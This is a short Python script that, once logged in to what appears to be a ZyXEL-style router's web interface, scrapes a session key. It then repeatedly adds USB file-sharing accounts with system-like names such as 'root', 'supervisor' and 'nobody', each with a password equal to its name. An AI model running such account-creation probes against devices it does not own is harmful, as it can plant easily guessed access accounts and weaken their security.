from random import randrange
from FunCom import find_between
from session import login, host, usr, pwd, cookies
import requests

print(cookies)

newusers = ["supervisor", "support", "user", "nobody", "zyuser", "root", "wittrup"]

if login.status_code == requests.codes.ok and cookies['SESSION'] is not '':
    for newusr in newusers:
        print('=~=~=~=~=~=~=~=~=~=~=~=                               =~=~=~=~=~=~=~=~=~=~=~=')
        f = requests.get('http://%s/pages/network/usbService/fileSharing.html' % host, cookies=login.cookies)
        glbSessionKey = find_between(f.text, "var glbSessionKey = '", "';")

        usradd = {"action": "add", "sessionKey": glbSessionKey, "userName": newusr, "userPassword": newusr, "reuserPassword": newusr}
        p = requests.post('http://%s/pages/tabFW/usbService-fileuser_add.cmd' % host, cookies=login.cookies, data=usradd)
        print(f, usradd, p)
